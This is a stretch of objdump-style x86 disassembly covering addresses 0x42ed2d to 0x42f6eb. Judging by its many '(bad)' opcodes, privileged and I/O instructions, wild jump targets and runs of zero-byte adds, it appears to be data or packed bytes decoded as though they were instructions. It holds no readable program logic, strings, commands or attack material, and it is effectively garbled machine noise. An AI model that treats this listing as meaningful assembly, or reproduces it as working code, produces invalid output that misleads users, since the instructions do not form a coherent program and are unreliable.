  42ed2d:	jmp    0x42ecaf
  42ed2f:	(bad)  
  42ed30:	stc    
  42ed31:	jmp    0xd732eca5
  42ed36:	fs jmp esi
  42ed39:	ret    0xff60
  42ed3c:	fdiv   QWORD PTR [eax-0x5f2b009f]
  42ed42:	pusha  
  42ed43:	dec    ebp
  42ed45:	xchg   edx,eax
  42ed46:	pop    esp
  42ed47:	inc    eax
  42ed49:	jns    0x42ed98
  42ed4b:	call   DWORD PTR [edi+0x7fff3355]
  42ed51:	shl    DWORD PTR [edx-0x1],0x9b
  42ed55:	ja     0x42eda8
  42ed57:	dec    DWORD PTR [eax+edi*2+0x527cff50]
  42ed5e:	xor    edi,edx
  42ed60:	cmp    DWORD PTR [eax],0x1f
  42ed63:	dec    eax
	...
  42ed7c:	dec    ecx
  42ed7d:	xchg   esi,eax
  42ed7e:	and    al,0xd7
  42ed80:	and    edx,ecx
  42ed82:	jmp    DWORD PTR cs:[ebx]
  42ed85:	(bad)  
  42ed86:	cmp    edi,edi
  42ed88:	das    
  42ed89:	rcl    DWORD PTR [eax-0x1],cl
  42ed8c:	dec    esp
  42ed8d:	fisub  DWORD PTR [edi+edi*8-0x32]
  42ed91:	call   0xf930ed5d
  42ed96:	icebp  
  42ed97:	dec    eax
  42ed99:	std    
  42ed9a:	idiv   edi
  42ed9c:	cmc    
  42ed9d:	std    
  42ed9e:	clc    
  42ed9f:	push   ecx
  42eda1:	lock leave 
  42eda3:	jmp    edi
  42eda5:	in     al,0xa1
  42eda7:	(bad)  
  42eda8:	(bad)  
  42edaa:	pushf  
  42edab:	(bad)  
  42edac:	out    dx,eax
  42edad:	in     eax,0x7e
  42edaf:	(bad)  
  42edb0:	stc    
  42edb1:	call   0xd632ed26
  42edb6:	addr16 jmp ebp
  42edb9:	ret    0xff64
  42edbc:	fdiv   QWORD PTR [eax-0x5f2b009c]
  42edc2:	arpl   di,di
  42edc4:	int    0x92
  42edc6:	pop    esi
  42edc7:	inc    eax
  42edc9:	jns    0x42ee19
  42edcb:	call   FWORD PTR [ebx-0x7e00c39d]
  42edd1:	fst    DWORD PTR [ecx+0x3f5f97ff]
  42edd7:	dec    DWORD PTR [esi-0x6900e2d5]
  42eddd:	cs pop ds
  42eddf:	pushf  
	...
  42edfc:	js     0x42ee70
  42edfe:	xor    al,0x3e
  42ee00:	inc    esp
  42ee01:	lods   eax,DWORD PTR ds:[esi]
  42ee02:	sub    eax,0x30b01fef
  42ee07:	jmp    FWORD PTR [eax]
  42ee09:	ret    
  42ee0a:	cmp    eax,0x5cd347ff
  42ee0f:	dec    eax
  42ee11:	fistp  QWORD PTR [esi-0x1d0c2c01]
  42ee17:	dec    edi
  42ee19:	stc    
  42ee1a:	out    dx,al
  42ee1b:	jmp    ebp
  42ee1d:	sti    
  42ee1e:	icebp  
  42ee1f:	(bad)  
  42ee20:	in     al,dx
  42ee21:	cmc    
  42ee22:	loope  0x42ee23
  42ee24:	in     eax,0xee
  42ee26:	aam    0xff
  42ee28:	(bad)  
  42ee2a:	call   0xf9ff:0x70e1ecff
  42ee31:	jmp    0xff65:0xd3efff6d
  42ee38:	in     al,0xbd
  42ee3a:	gs (bad) 
  42ee3c:	fld    TBYTE PTR [ebp-0x642e009c]
  42ee42:	pusha  
  42ee43:	(bad)  
  42ee44:	mov    ebx,0xadff4d7d
  42ee49:	data16 aas 
  42ee4b:	call   DWORD PTR [esi-0x7b00cdad]
  42ee51:	mov    ebp,0x9580ff72
  42ee56:	push   esi
  42ee57:	inc    DWORD PTR [ebx-0x681cca9c]
  42ee5d:	inc    ecx
  42ee5e:	sub    BYTE PTR ds:0x0,dl
	...
  42ee80:	outs   dx,DWORD PTR ds:[esi]
  42ee81:	js     0x42eeb5
  42ee83:	ins    DWORD PTR es:[edi],dx
  42ee84:	inc    ebx
  42ee85:	test   al,0x2f
  42ee87:	hlt    
  42ee88:	sub    BYTE PTR [edi-0x3dcf00c5],bh
  42ee8e:	inc    edx
  42ee8f:	dec    DWORD PTR [ecx-0x20]
  42ee92:	(bad)  
  42ee93:	dec    edi
  42ee95:	fisubr WORD PTR [edx-0x2e113301]
  42ee9b:	inc    esi
  42ee9d:	mul    esi
  42ee9f:	inc    esi
  42eea1:	clc    
  42eea2:	jmp    0xd735cfa6
  42eea7:	call   ebx
  42eea9:	mov    esi,0xd7eaff5c
  42eeae:	arpl   di,di
  42eeb0:	in     eax,dx
  42eeb1:	fsub   DWORD PTR [edx-0x1]
  42eeb4:	call   0xe7425087
  42eeb9:	ret    0xff63
  42eebc:	fisubr DWORD PTR [edx+eiz*2+0x5489c2ff]
  42eec3:	push   DWORD PTR [eax-0x5100b68d]
  42eec9:	or     DWORD PTR [edi-0x1],0xff519297
  42eed0:	inc    edx
  42eed1:	(bad)  [ecx-0x1]
  42eed4:	push   ebp
  42eed5:	mov    edx,0x6074f15f
  42eeda:	das    
  42eedb:	dec    ebx
	...
  42ef04:	jo     0x42ee90
  42ef06:	cmp    BYTE PTR [edi+0x4b],ch
  42ef09:	mov    al,0x35
  42ef0b:	lock and bh,BYTE PTR [ebx-0x37a000cc]
  42ef12:	fs inc edi
  42ef15:	lods   eax,DWORD PTR ds:[esi]
  42ef16:	inc    edi
  42ef17:	dec    ebp
  42ef19:	ret    0xff66
  42ef1c:	call   0xb9e5:0xc0ffc6ea
  42ef23:	dec    ebx
  42ef25:	mov    edx,0xa4c3ff63
  42ef2a:	inc    eax
  42ef2b:	inc    ecx
  42ef2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef2e:	dec    esp
  42ef2f:	(bad)  
  42ef30:	mov    ebx,0xc5ff4495
  42ef35:	popf   
  42ef36:	inc    edi
  42ef37:	(bad)  
  42ef38:	(bad)  [edi-0x542a00a5]
  42ef3e:	pop    esp
  42ef3f:	dec    eax
  42ef41:	xchg   esp,eax
  42ef42:	push   edx
  42ef43:	push   DWORD PTR [ebx-0x4f00a771]
  42ef49:	xchg   esi,eax
  42ef4a:	pop    edi
  42ef4b:	call   DWORD PTR [edi+0x4cff487e]
  42ef51:	lods   eax,DWORD PTR ds:[esi]
  42ef52:	dec    ebp
  42ef53:	jmp    0x42efc0
  42ef55:	jb     0x42ef8e
  42ef57:	push   ebx
	...
  42ef88:	jb     0x42ef1a
  42ef8a:	cmp    al,BYTE PTR [ecx+0x5c]
  42ef8d:	mov    cl,0x3d
  42ef8f:	fimul  DWORD PTR [ecx-0x42]
  42ef92:	push   eax
  42ef93:	(bad)  
  42ef94:	stos   DWORD PTR es:[edi],eax
  42ef95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef96:	dec    esi
  42ef97:	(bad)  
  42ef98:	mov    ebx,0xc0ff49a4
  42ef9d:	mov    ebp,0xcab7ff6f
  42efa2:	cmp    edi,0xff6cbac4
  42efa8:	mov    edi,0xddff489f
  42efad:	out    dx,al
  42efae:	int    0xff
  42efb0:	fadd   st(5),st
  42efb2:	mov    ?,edi
  42efb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efb5:	je     0x42efe9
  42efb7:	inc    ebp
  42efb9:	mov    ds:0xa1c6ff56,eax
  42efbe:	pop    ebx
  42efbf:	inc    ebx
  42efc1:	mov    cs,WORD PTR [ebp-0x1]
  42efc4:	mov    esp,0xb2ff4e88
  42efc9:	mov    WORD PTR [eax-0x6],ss
  42efcc:	lahf   
  42efcd:	jns    0x42f011
  42efcf:	mov    DWORD PTR [ecx+eax*4+0x2f45],0x0
	...
  42f00e:	add    BYTE PTR [eax],al
  42f010:	push   0xffffff99
  42f012:	aas    
  42f013:	lea    ebx,[esi+esi*4+0x4b]
  42f017:	jmp    0xfea7af66
  42f01c:	imul   eax,esp,0x75
  42f01f:	call   FWORD PTR [ebx-0x33]
  42f022:	cmp    edi,0xff95cfb3
  42f028:	shl    DWORD PTR [ebp-0x1b2c00a8],0xda
  42f02f:	jmp    edx
  42f031:	in     al,dx
  42f032:	in     eax,0xff
  42f034:	mov    esi,0xbfff639a
  42f039:	popf   
  42f03a:	pop    ebp
  42f03b:	inc    eax
  42f03d:	xchg   esp,eax
  42f03e:	push   edi
  42f03f:	(bad)  
  42f040:	mov    edx,0xadf74983
  42f045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f046:	push   0xffffffd7
  42f048:	lahf   
  42f049:	fwait
  42f04a:	pop    ebp
  42f04b:	jl     0x42f04d
	...
  42f095:	add    BYTE PTR [eax],al
  42f097:	add    BYTE PTR [ecx+ebx*4-0x495b97a3],dl
  42f09e:	add    esi,0xffffffa7
  42f0a1:	scas   eax,DWORD PTR es:[edi]
  42f0a2:	jbe    0x42f08b
  42f0a4:	mov    dl,0x97
  42f0a6:	pop    eax
  42f0a7:	repz mov al,0xab
  42f0aa:	js     0x42f0a8
  42f0ac:	ret    0xc0d0
  42f0af:	inc    edi
  42f0b1:	(bad)  
  42f0b2:	scas   al,BYTE PTR es:[edi]
  42f0b3:	std    
  42f0b4:	mov    ah,0x85
  42f0b6:	push   ebp
  42f0b7:	jmp    0x85c3:0xb95188c1
  42f0be:	push   edx
  42f0bf:	xchg   DWORD PTR [ebx+0x435084],ebp
	...
  42f16d:	add    BYTE PTR [eax],al
  42f16f:	add    bh,bh
  42f171:	add    BYTE PTR [eax],0x3f
  42f174:	inc    BYTE PTR [eax]
  42f176:	add    BYTE PTR [edi],al
  42f178:	clc    
  42f179:	add    BYTE PTR [eax],al
  42f17b:	add    edi,eax
  42f17d:	add    BYTE PTR [eax],al
  42f17f:	add    eax,edi
  42f181:	add    BYTE PTR [eax],al
  42f183:	add    eax,edi
  42f185:	add    BYTE PTR [eax],al
  42f187:	add    esi,eax
  42f189:	add    BYTE PTR [eax],al
  42f18b:	pop    es
  42f18c:	loopne 0x42f18e
  42f18e:	add    BYTE PTR [edi],cl
  42f190:	loopne 0x42f192
  42f192:	add    BYTE PTR [edi],cl
  42f194:	rol    BYTE PTR [eax],0x0
  42f197:	pop    es
  42f198:	rol    BYTE PTR [eax],0x0
  42f19b:	pop    es
  42f19c:	add    BYTE PTR [eax],0x0
  42f19f:	add    eax,DWORD PTR [eax-0x7ffd0000]
  42f1a5:	add    BYTE PTR [eax],al
  42f1a7:	add    eax,DWORD PTR [eax-0x7ffd0000]
  42f1ad:	add    BYTE PTR [eax],al
  42f1af:	add    eax,DWORD PTR [eax-0x7ffd0000]
  42f1b5:	add    BYTE PTR [eax],al
  42f1b7:	add    eax,DWORD PTR [eax-0x7ffd0000]
  42f1bd:	add    BYTE PTR [eax],al
  42f1bf:	add    eax,DWORD PTR [eax-0x7ffd0000]
  42f1c5:	add    BYTE PTR [eax],al
  42f1c7:	add    eax,eax
  42f1c9:	add    BYTE PTR [eax],al
  42f1cb:	pop    es
  42f1cc:	rol    BYTE PTR [eax],0x0
  42f1cf:	pop    es
  42f1d0:	loopne 0x42f1d2
  42f1d2:	add    BYTE PTR [edi],cl
  42f1d4:	loopne 0x42f1d6
  42f1d6:	add    BYTE PTR [edi],cl
  42f1d8:	lock add BYTE PTR [eax],al
  42f1db:	pop    ds
  42f1dc:	clc    
  42f1dd:	add    BYTE PTR [eax],al
  42f1df:	aas    
  42f1e0:	cld    
  42f1e1:	add    BYTE PTR [eax],al
  42f1e3:	jg     0x42f1e4
  42f1e5:	add    BYTE PTR [ecx],al
  42f1e7:	(bad)  
  42f1e8:	inc    eax
  42f1ea:	pop    es
  42f1eb:	(bad)  
  42f1ec:	(bad)  
  42f1ed:	(bad)  
  42f1ee:	(bad)  
  42f1ef:	jmp    FWORD PTR [eax]
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [eax],bl
  42f1f5:	add    BYTE PTR [eax],al
  42f1f7:	add    BYTE PTR [eax],dh
  42f1f9:	add    BYTE PTR [eax],al
  42f1fb:	add    BYTE PTR [ecx],al
  42f1fd:	add    BYTE PTR [eax],ah
  42f1ff:	add    BYTE PTR [eax],al
  42f201:	add    BYTE PTR [eax],al
  42f203:	add    BYTE PTR [eax+0x9],ah
	...
  42f22e:	add    BYTE PTR [eax],cl
  42f230:	add    BYTE PTR [eax],al
  42f232:	add    BYTE PTR [ecx],ah
  42f234:	add    BYTE PTR [eax],al
  42f236:	add    BYTE PTR [ebp+0x3],al
  42f239:	add    BYTE PTR [eax],al
  42f23b:	outs   dx,DWORD PTR ds:[esi]
  42f23c:	push   es
  42f23d:	add    BYTE PTR [ecx],al
  42f23f:	(bad)  
  42f240:	or     al,0x2
  42f242:	add    al,0xa0
  42f244:	or     eax,DWORD PTR ds:0x60aa404
  42f24a:	add    eax,0x203079b
  42f24f:	mov    eax,DWORD PTR [eax]
  42f251:	add    BYTE PTR [eax],al
  42f253:	jae    0x42f255
  42f255:	add    BYTE PTR [eax],al
  42f257:	pop    edx
  42f258:	add    BYTE PTR [eax],al
  42f25a:	add    BYTE PTR [edx+0x0],cl
  42f25d:	add    BYTE PTR [eax],al
  42f25f:	cmp    eax,DWORD PTR [eax]
  42f261:	add    BYTE PTR [eax],al
  42f263:	sub    al,BYTE PTR [eax]
  42f265:	add    BYTE PTR [eax],al
  42f267:	sbb    DWORD PTR [eax],eax
  42f269:	add    BYTE PTR [eax],al
  42f26b:	or     al,0x0
  42f26d:	add    BYTE PTR [eax],al
  42f26f:	add    eax,DWORD PTR [eax]
	...
  42f289:	add    BYTE PTR [eax],al
  42f28b:	sbb    al,BYTE PTR [eax]
  42f28d:	add    BYTE PTR [eax],al
  42f28f:	dec    esp
  42f290:	adc    eax,DWORD PTR [esi]
  42f292:	push   es
  42f293:	xchg   edx,eax
  42f294:	and    bl,BYTE PTR [edi]
  42f296:	bswap  edi
  42f298:	aas    
  42f299:	inc    edx
  42f29a:	pop    ds
  42f29b:	stc    
  42f29c:	arpl   WORD PTR [ebp+0x31],sp
  42f29f:	dec    DWORD PTR [esi-0x4400b783]
  42f2a5:	jle    0x42f2fd
  42f2a7:	inc    ebx
  42f2a9:	jge    0x42f300
  42f2ab:	(bad)  
  42f2ac:	mov    eax,0x90fa4f7a
  42f2b1:	fs (bad) ds:[ebx+0x38]
  42f2b6:	and    BYTE PTR [eax+0x7a0a101a],ch
  42f2bc:	add    BYTE PTR [eax],al
  42f2be:	add    BYTE PTR [eax+0x0],dl
  42f2c1:	add    BYTE PTR [eax],al
  42f2c3:	dec    ebx
  42f2c4:	add    BYTE PTR [eax],al
  42f2c6:	add    BYTE PTR [eax+0x0],al
  42f2c9:	add    BYTE PTR [eax],al
  42f2cb:	xor    BYTE PTR [eax],al
  42f2cd:	add    BYTE PTR [eax],al
  42f2cf:	push   ds
  42f2d0:	add    BYTE PTR [eax],al
  42f2d2:	add    BYTE PTR [ecx],cl
	...
  42f2e8:	add    eax,DWORD PTR [edx]
  42f2ea:	add    bh,BYTE PTR [eax]
  42f2ec:	push   edx
  42f2ed:	and    BYTE PTR es:[edx-0xac4b86b],dh
  42f2f4:	pop    ebp
  42f2f5:	jg     0x42f332
  42f2f7:	call   DWORD PTR [edx-0x65]
  42f2fa:	inc    eax
  42f2fb:	dec    DWORD PTR [ebp-0x5b]
  42f2fe:	aas    
  42f2ff:	inc    DWORD PTR [ecx-0x50]
  42f302:	cmp    bh,bh
  42f304:	js     0x42f2a8
  42f306:	inc    esi
  42f307:	jmp    FWORD PTR [edx-0x3d00b080]
  42f30d:	xchg   BYTE PTR [esi-0x1],dl
  42f310:	fsub   QWORD PTR [edx-0x450e009c]
  42f316:	outs   dx,BYTE PTR ds:[esi]
  42f317:	dec    ebp
  42f319:	popf   
  42f31a:	pop    esp
  42f31b:	in     eax,0x6c
  42f31d:	dec    edi
  42f31e:	cs cdq 
  42f320:	add    eax,DWORD PTR [eax]
  42f322:	add    BYTE PTR [ebp+0x0],al
  42f325:	add    BYTE PTR [eax],al
  42f327:	cmp    eax,0x3c000000
  42f32c:	add    BYTE PTR [eax],al
  42f32e:	add    BYTE PTR [eax],dh
  42f330:	add    BYTE PTR [eax],al
  42f332:	add    BYTE PTR [eax+eax*1],dl
  42f335:	add    BYTE PTR [eax],al
  42f337:	add    DWORD PTR [eax],eax
	...
  42f341:	add    BYTE PTR [eax],al
  42f343:	add    BYTE PTR [ebp-0x6bf3c6bf],al
  42f349:	inc    esi
  42f34a:	cmp    dh,BYTE PTR [ecx-0xbdaf50]
  42f350:	fwait
  42f351:	pop    edi
  42f352:	inc    ebx
  42f353:	call   DWORD PTR [edi-0x65]
  42f356:	notrack call DWORD PTR [ebp-0x63]
  42f35a:	cmp    bh,bh
  42f35c:	aas    
  42f35d:	cdq    
  42f35e:	xor    edi,edi
  42f360:	mov    ss:0xac3dff2d,al
  42f366:	xor    bh,bh
  42f368:	push   ebx
  42f369:	mov    al,0x37
  42f36b:	inc    DWORD PTR [edx-0x4400bd6c]
  42f371:	ja     0x42f3bf
  42f373:	call   edx
  42f375:	xchg   ebx,eax
  42f376:	pop    eax
  42f377:	jmp    ebx
  42f379:	test   eax,0xb7ecff64
  42f37e:	outs   dx,BYTE PTR ds:[esi]
  42f37f:	jmp    FWORD PTR [esi+0x15c54a7e]
  42f385:	invd   
  42f387:	inc    eax
  42f388:	add    BYTE PTR [eax],al
  42f38a:	add    BYTE PTR [ebx],ch
  42f38c:	add    BYTE PTR [eax],al
  42f38e:	add    BYTE PTR [ebx],bl
  42f390:	add    BYTE PTR [eax],al
  42f392:	add    BYTE PTR [eax],cl
	...
  42f3a0:	mov    ebx,0xbc06434f
  42f3a5:	push   edi
  42f3a6:	dec    ecx
  42f3a7:	mov    eax,0xff414eae
  42f3ac:	mov    WORD PTR [edx+0x3c],ds
  42f3af:	(bad)  
  42f3b0:	test   BYTE PTR ds:0x25842dff,ch
  42f3b7:	jmp    FWORD PTR [ebx]
  42f3b9:	jle    0x42f3dc
  42f3bb:	call   FWORD PTR [edi]
  42f3bd:	test   DWORD PTR [eax],ebx
  42f3bf:	jmp    DWORD PTR [ebx]
  42f3c1:	test   DWORD PTR [edi],edx
  42f3c3:	jmp    DWORD PTR [esi]
  42f3c5:	mov    bl,BYTE PTR [eax]
  42f3c7:	jmp    DWORD PTR [edi]
  42f3c9:	lahf   
  42f3ca:	sbb    al,0xff
  42f3cc:	inc    ebp
  42f3cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3ce:	sub    bh,bh
  42f3d0:	xchg   ebp,eax
  42f3d1:	jo     0x42f40b
  42f3d3:	push   DWORD PTR [edi-0x3500bd93]
  42f3d9:	test   BYTE PTR [esi-0x1],cl
  42f3dc:	into   
  42f3dd:	lea    edx,[ebp-0x1]
  42f3e0:	fcomp  QWORD PTR [esi-0x7e40009e]
  42f3e6:	push   eax
  42f3e7:	leave  
  42f3e8:	aas    
  42f3e9:	and    edx,DWORD PTR [ebx]
  42f3eb:	adc    eax,DWORD PTR [eax]
	...
  42f3fd:	add    BYTE PTR [eax],al
  42f3ff:	add    BYTE PTR [ebx-0x5168bdb1],dh
  42f405:	push   eax
  42f406:	inc    esp
  42f407:	call   DWORD PTR [edi+0x46ff3e52]
  42f40d:	jl     0x42f43d
  42f40f:	call   FWORD PTR [ecx]
  42f411:	jae    0x42f42c
  42f413:	call   FWORD PTR [eax]
  42f415:	outs   dx,BYTE PTR ds:[esi]
  42f416:	adc    bh,bh
  42f418:	adc    eax,0x18ff0d77
  42f41d:	jl     0x42f42a
  42f41f:	jmp    DWORD PTR [ecx]
  42f421:	mov    BYTE PTR [ebx],dl
  42f423:	call   FWORD PTR ds:0x24ff1390
  42f429:	pushf  
  42f42a:	sbb    edi,edi
  42f42c:	sbb    al,0xa8
  42f42e:	sbb    bh,bh
  42f430:	dec    esp
  42f431:	xchg   esp,eax
  42f432:	sub    edi,edi
  42f434:	mov    eax,ds:0xbeff3158
  42f439:	addr16 aas 
  42f43b:	inc    eax
  42f43d:	outs   dx,DWORD PTR ds:[esi]
  42f43e:	inc    esp
  42f43f:	inc    ebx
  42f441:	jne    0x42f48e
  42f443:	dec    edx
  42f445:	test   DWORD PTR [edi-0x1],edx
  42f448:	fnstcw WORD PTR [ecx+0x51]
  42f44b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  42f45c:	lods   al,BYTE PTR ds:[esi]
  42f45d:	xor    BYTE PTR ds:[eax-0x4e],dl
  42f461:	dec    ebx
  42f462:	call   FWORD PTR ds:[esi+0x62ff3743]
  42f469:	js     0x42f4a2
  42f46b:	call   DWORD PTR [esi+edi*2]
  42f46e:	adc    edi,edi
  42f470:	push   ds
  42f471:	jbe    0x42f480
  42f473:	call   FWORD PTR [edi]
  42f475:	test   DWORD PTR [edx],edx
  42f477:	jmp    DWORD PTR [ebx]
  42f479:	test   DWORD PTR ds:0x158e25ff,edx
  42f47f:	jmp    FWORD PTR [ecx]
  42f481:	popf   
  42f482:	push   ds
  42f483:	dec    DWORD PTR [ebp-0x70]
  42f486:	das    
  42f487:	jmp    DWORD PTR [eax+0x77]
  42f48a:	sub    eax,0x286d69ff
  42f48f:	jmp    FWORD PTR [esi+0x5f]
  42f492:	and    al,0xff
  42f494:	xchg   esi,eax
  42f495:	inc    esi
  42f496:	daa    
  42f497:	push   DWORD PTR [esi-0x4800cbac]
  42f49d:	push   ebp
  42f49e:	ss (bad) 
  42f4a0:	mov    eax,0xbaff3b5d
  42f4a5:	fs inc edx
  42f4a7:	(bad)  
  42f4a8:	mov    esi,0xc5ff4c71
  42f4ad:	imul   eax,DWORD PTR [ebx+0x52],0x0
  42f4b4:	add    BYTE PTR [eax],al
  42f4b6:	add    BYTE PTR [eax],al
  42f4b8:	test   al,0x34
  42f4ba:	daa    
  42f4bb:	or     DWORD PTR [eax-0x5336d7ca],ebp
  42f4c1:	ss sub edi,edi
  42f4c4:	xchg   ecx,eax
  42f4c5:	das    
  42f4c6:	and    bh,bh
  42f4c8:	xor    al,0x7c
  42f4ca:	sbb    al,0xff
  42f4cc:	adc    DWORD PTR [ebx+ecx*1+0x198f28ff],ecx
  42f4d3:	push   DWORD PTR [ecx]
  42f4d5:	sahf   
  42f4d6:	and    eax,0x27a733ff
  42f4db:	push   DWORD PTR [eax+edi*4]
  42f4de:	inc    DWORD PTR ss:[edx-0x41]
  42f4e2:	inc    esi
  42f4e3:	dec    DWORD PTR [ecx-0x6000ceab]
  42f4e9:	xor    ah,BYTE PTR [edi+edi*8]
  42f4ec:	lods   al,BYTE PTR ds:[esi]
  42f4ed:	ss sub bh,bh
  42f4f0:	scas   al,BYTE PTR es:[edi]
  42f4f1:	cmp    BYTE PTR [eax],ch
  42f4f3:	jmp    FWORD PTR [edi-0x4c00d3bf]
  42f4f9:	dec    eax
  42f4fa:	das    
  42f4fb:	push   DWORD PTR [ebx-0x4c00ceb7]
  42f501:	dec    edx
  42f502:	xor    bh,bh
  42f504:	mov    bl,0x50
  42f506:	xor    eax,0x3855b3ff
  42f50b:	(bad)  
  42f50c:	mov    ecx,0xb4c8405f
  42f511:	push   ebp
  42f512:	cmp    BYTE PTR [eax+eax*1],cl
  42f515:	add    BYTE PTR [eax],al
  42f517:	add    BYTE PTR [edi-0x5abfdace],ah
  42f51d:	xor    esp,DWORD PTR [esi]
  42f51f:	jmp    FWORD PTR [ebx-0x6500d8cb]
  42f525:	sub    DWORD PTR ds:0x194c65ff,ebx
  42f52b:	call   DWORD PTR [esi]
  42f52d:	mov    dh,0x25
  42f52f:	push   DWORD PTR [ecx]
  42f531:	stos   BYTE PTR es:[edi],al
  42f532:	sub    eax,0x3dbb3fff
  42f537:	call   DWORD PTR [edx-0x31]
  42f53a:	pop    ebx
  42f53b:	inc    DWORD PTR [edx+ebx*4+0x5f8eff58]
  42f542:	cmp    edi,edi
  42f544:	xchg   ebx,eax
  42f545:	xor    al,0x21
  42f547:	push   DWORD PTR [ebp-0x4500d3c2]
  42f54d:	cmp    eax,0x3db7ff2e
  42f552:	sub    al,0xff
  42f554:	mov    dh,0x3d
  42f556:	sub    al,0xff
  42f558:	mov    dl,0x3f
  42f55a:	sub    al,0xff
  42f55c:	mov    dl,0x41
  42f55e:	sub    eax,0x2f45b1ff
  42f563:	push   DWORD PTR [edx-0x4f00cfba]
  42f569:	inc    edi
  42f56a:	das    
  42f56b:	push   DWORD PTR [edx-0x4c00c9af]
  42f571:	push   ebx
  42f572:	ss inc esp
  42f574:	add    BYTE PTR [eax],al
  42f576:	add    BYTE PTR [eax],al
  42f578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f579:	xor    ah,BYTE PTR ds:0x2633a795
  42f57f:	jmp    DWORD PTR [eax+esi*1+0x329eff23]
  42f586:	and    bh,bh
  42f588:	jne    0x42f5d4
  42f58a:	and    edi,edi
  42f58c:	push   ebx
  42f58d:	mov    DWORD PTR [edx],esi
  42f58f:	call   FWORD PTR [ecx-0x64]
  42f592:	inc    ecx
  42f593:	jmp    FWORD PTR [ebp-0x72]
  42f596:	inc    eax
  42f597:	dec    DWORD PTR [edx-0x6400be8e]
  42f59d:	inc    eax
  42f59e:	and    edi,edi
  42f5a0:	mov    al,0x51
  42f5a2:	das    
  42f5a3:	(bad)  
  42f5a4:	mov    ebx,0xc0ff3a5f
  42f5a9:	pop    esi
  42f5aa:	cmp    eax,0x3853bdff
  42f5af:	(bad)  
  42f5b0:	mov    ecx,0xb6ff3146
  42f5b5:	cmp    eax,0x3ab4ff2d
  42f5ba:	sub    bh,bh
  42f5bc:	mov    bl,0x3c
  42f5be:	sub    edi,edi
  42f5c0:	mov    al,0x3d
  42f5c2:	sub    edi,edi
  42f5c4:	pushf  
  42f5c5:	xor    esp,DWORD PTR [edx]
  42f5c7:	call   FWORD PTR [ebx-0x6200d8c6]
  42f5cd:	cmp    ah,BYTE PTR [edi]
  42f5cf:	jmp    DWORD PTR [edi+0x93334a]
  42f5d5:	add    BYTE PTR [eax],al
  42f5d7:	add    BYTE PTR [esi-0x5e2adbcf],ah
  42f5dd:	cs and bh,bh
  42f5e0:	xchg   ecx,eax
  42f5e1:	sub    eax,0x517dff1d
  42f5e6:	sub    bh,bh
  42f5e8:	fwait
  42f5e9:	dec    ebp
  42f5ea:	sub    edi,edi
  42f5ec:	stos   DWORD PTR es:[edi],eax
  42f5ed:	dec    esi
  42f5ee:	sub    edi,edi
  42f5f0:	scas   al,BYTE PTR es:[edi]
  42f5f1:	pop    esp
  42f5f2:	sub    eax,0x2654aeff
  42f5f7:	push   DWORD PTR [edi-0x3c00d8a3]
  42f5fd:	jb     0x42f634
  42f5ff:	call   eax
  42f601:	jle    0x42f643
  42f603:	dec    esp
  42f605:	jnp    0x42f649
  42f607:	inc    edi
  42f609:	jae    0x42f64e
  42f60b:	inc    esp
  42f60d:	imul   eax,DWORD PTR [ebx-0x1],0xffffffc0
  42f611:	pop    edi
  42f612:	cmp    eax,0x354dbbff
  42f617:	(bad)  
  42f618:	mov    eax,0xb4ff2d3f
  42f61d:	cmp    DWORD PTR [edx],ebp
  42f61f:	call   FWORD PTR [esi+ebp*1+0x3e7dff20]
  42f626:	sbb    eax,0x20813bff
  42f62b:	jmp    FWORD PTR [eax+0x49]
  42f62e:	and    bh,bh
  42f630:	mov    edi,DWORD PTR [ecx]
  42f632:	and    al,0xe6
  42f634:	xchg   DWORD PTR [edx+0x26],eax
  42f637:	or     DWORD PTR [esi-0x6d09ded4],ebx
  42f63d:	and    al,0x1b
  42f63f:	jmp    FWORD PTR [esi+0x56]
  42f642:	and    edi,edi
  42f644:	jno    0x42f6b1
  42f646:	sub    bh,bh
  42f648:	mov    bh,0x56
  42f64a:	and    eax,0x276cc1ff
  42f64f:	(bad)  
  42f650:	mov    ebx,0xc7ff327c
  42f655:	xor    DWORD PTR [edx],0x3790d5ff
  42f65b:	(bad)  
  42f65c:	fcom   DWORD PTR [ebp-0x6d2b00c6]
  42f662:	cmp    edi,edi
  42f664:	ror    DWORD PTR [ebp-0x7a3200c2],cl
  42f66a:	inc    ecx
  42f66b:	dec    edx
  42f66d:	jl     0x42f6b3
  42f66f:	inc    ebp
  42f671:	jb     0x42f6b9
  42f673:	inc    ecx
  42f675:	fs inc eax
  42f677:	(bad)  
  42f678:	mov    ebx,0xb5ff364f
  42f67d:	cmp    BYTE PTR [ebx],ch
  42f67f:	call   DWORD PTR [eax+esi*1-0x6ebf00e2]
  42f686:	dec    DWORD PTR cs:[ebx]
  42f689:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f68a:	and    eax,0x1c831eff
  42f68f:	(bad)  
  42f690:	cmp    al,0x51
  42f692:	adc    edi,edi
  42f694:	ds dec edx
  42f696:	adc    ecx,DWORD PTR [esi]
  42f698:	mov    fs,WORD PTR ds:0x4e70ff1b
  42f69e:	pop    ds
  42f69f:	dec    DWORD PTR [eax+eax*4+0x27]
  42f6a3:	call   DWORD PTR [edx+edx*2+0x67afff20]
  42f6aa:	and    al,0xff
  42f6ac:	mov    ch,0x83
  42f6ae:	xor    bh,bh
  42f6b0:	enter  0x3d99,0xff
  42f6b4:	rcr    DWORD PTR [esi-0x552200cc],cl
  42f6ba:	cmp    bh,bh
  42f6bc:	fild   QWORD PTR [edi-0x542200c4]
  42f6c2:	ds (bad) 
  42f6c4:	(bad)  [ebp+edi*1+0x3f9ad6ff]
  42f6cb:	call   ecx
  42f6cd:	mov    es,WORD PTR [ebx-0x1]
  42f6d0:	retf   
  42f6d1:	jg     0x42f71a
  42f6d3:	inc    esi
  42f6d5:	jae    0x42f71e
  42f6d7:	inc    edx
  42f6d9:	arpl   WORD PTR [ecx-0x1],ax
  42f6dc:	mov    ah,0x43
  42f6de:	das    
  42f6df:	call   FWORD PTR [eax+0x3dff1e33]
  42f6e5:	mov    bl,0x5a
  42f6e7:	jmp    DWORD PTR [ecx+esi*4]
  42f6ea:	pop    eax
  42f6eb:	call   DWORD PTR [edx]
